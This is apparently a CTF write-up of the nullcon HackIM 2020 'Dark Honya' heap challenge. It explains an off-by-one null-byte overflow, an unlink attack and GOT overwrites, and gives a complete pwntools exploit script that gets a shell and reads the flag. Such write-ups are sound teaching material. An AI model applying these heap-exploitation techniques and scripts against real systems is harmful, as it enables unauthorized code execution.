---
title: Dark Honya -- nullcon HackIM 2020
categories: [Blogging, Tutorial]
tags: [nullcon20, pwn]
date: 2020-02-09
# authors: ["pedro-bernardo", "Jorge", "jofra"]
---

# Dark Honya -- nullcon HackIM 2020
**Points:** 460 (dynamic)

## TL;DR
1. Null byte overflow on heap chunk
2. Free overflown chunk
3. Overwrite ptr array 
4. Write `printf@plt` on `free@got` to obtain a libc leak
5. Write `system` on `atoi@got` to get a shell


### Binary Mitigations
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

## Reversing
The program provided three functionalities:

#### 1. Buy a book
```c
void buy()
{
  char *chunk; 
  signed int i;

  for ( i = 0; ptr[i]; ++i )
    ;
    
  if ( i <= 15 )
  {
    chunk = malloc(0xF8);
    puts("Name of the book?");
    read_f8_buff(chunk);
    ptr[i] = chunk;
  }
  else
  {
    puts("Next time bring a bag with you!");
  }
}
```
#### 2. Return a book
```c
void put_back()
{
  int idx; 

  puts("Which book do you want to return?");
  idx = read_int();
  if ( (unsigned int)idx > 0xF )
    puts("boy, you cannot return what you dont have!");
  free(ptr[idx]);
  ptr[idx] = 0;
}

```

#### 3. Write on a book
```c
void write()
{
  int idx; 

  idx = read_int();
  if ( (unsigned int)idx <= 0xF )
  {
    puts("Name of the book?");
    read_f8_buff(ptr[idx]);
  }
  else
  {
    puts("Writing in the air now?");
  }
}
```

## Vulnerability

The binary uses `read_f8_buff` when reading data to buffers. This function reads 0xf8 bytes to a buffer and appends a '\x00' character to the end of the buffer. If 0xf8 characters are provided, the '\x00' will be appended out of bounds.

```c
void read_f8_buff(char *buff)
{
  int bytes_read; 

  bytes_read = read(0, buff, 0xF8);
  if ( bytes_read == -1 )
    puts("Err read string");
  buff[bytes_read] = 0; // off by one vulnerability
}
```

![](https://i.imgur.com/43FDHCJ.png)

## Exploitation Plan

### Step 1 - Control global ptr array entries
We can leverage the off-by-one vulnerability in `read_f8_buffer` to force a coalesce with an allocated chunk. This will call the `unlink` macro.

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            
    FD = P->fd;								      
    BK = P->bk;					
    // we have to satisfy this check
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
    else {		
        // important part
        FD->bk = BK;							   
        BK->fd = FD;							      
        ...							      
      }									      
}
```
By controlling the `FD` and `BK` pointers, we can write the chunk `BK` and `FD`s address on arbitrary memory, as long as `FD->bk == P` and `BK->fd == P`. So, effectively, we must have a pointer in memory to `P`. 

When we allocate a `chunk` its address is stored on the global `ptr` list.

This address points to the usable area inside the chunk (i.e. not the actual beginning of the chunk). With this in mind we prepare a `fake chunk` at the stored address with modified `size`,`fd` and `bk`pointers and next chunk's `prev_size`. We then free the next chunk to trigger a coalesce which will use the unlink macro.


![](https://i.imgur.com/QM5Q6jt.png)

This will overwrite ptr_array[2] with &ptr_array-8 (fake_chunk->fd). 

### Step 2 - Leak libc

We now control the global `ptr` array, so we can insert arbitrary addresses and use the write functionality to achieve a **write_what_where**. 
We will now:
1. Insert `free@got`'s address on the `ptr` array
2. Use the write functionality to replace the `free@got` with `printf@plt`
3. "Free" a chunk with a format string as it's content which will call `printf` and get us a`libc leak`


### Step 3 - Get shell

Since we have a`libc leak`, the next step is to call `system("/bin/sh")`. To do this we overwrite the `atoi` entry on the got with `system`. This way when the program asks us for the menu option we simply provide the string `/bin/sh`.


## Exploit Script
```python

from pwn import *

def go():
    s = remote("pwn2.ctf.nullcon.net", 5002)
    libc = ELF("./libc-2.23.so")
    ptr = 0x6021b0
    leak_offset = 0x20830
    
    # we're not using the name
    s.send("A"*8)

    # alocate 4 chunks
    for n in range(5-1):
        alloc(s, chr(ord('A')+n)*0x10)
    
    # alocate 5th chunk with format string needed to obtain a leak
    alloc(s, "LEAK:%15$p")

    # .bss entry must point to chunk-0x10, so we will create a fake chunk
    # 0x10 bytes after our allocated chunk, populating the prev_size with the 
    # correct size of our fake chunk
    write_name(s, 2, '\x00'*8 + p64(0xf1) + p64(ptr-0x18) + p64(ptr-0x10) + (0xf8-0x28)*'A' + p64(0xf0))

    # free the third chunk, triggering the unlink 
    free(s, 3)

    # free 0x602018
    # &ptr-0x8 is now written on the third entry of the pointer list
    # we now use it to change the first pointer to point to free@got
    write_name(s, 2, '\x00'*8 + p64(0x602018))


    # overwrite both free and puts to printf
    write_name(s, 0, p64(0x400680) + p64(0x400680))

    # trigger the printf on the fifth chunk and obtain a libc leak
    free(s, 4)

    s.recvuntil("LEAK:")
    libc.address = int(s.recv(14)[2:], 16) - leak_offset

    log.info("libc      @ {}".format(hex(libc.address)))

    # atoi 0x602060
    # replace atoi with system
    write_name(s, 2, '\x00'*8 + p64(0x602060))

    write_name(s, 0, p64(libc.symbols['system']))   

    s.sendline("/bin/sh")
    s.sendline("cat flag")

    s.interactive()

go()

# hackim20{Cause_Im_coming_atcha_like_a_dark_honya_?}
```

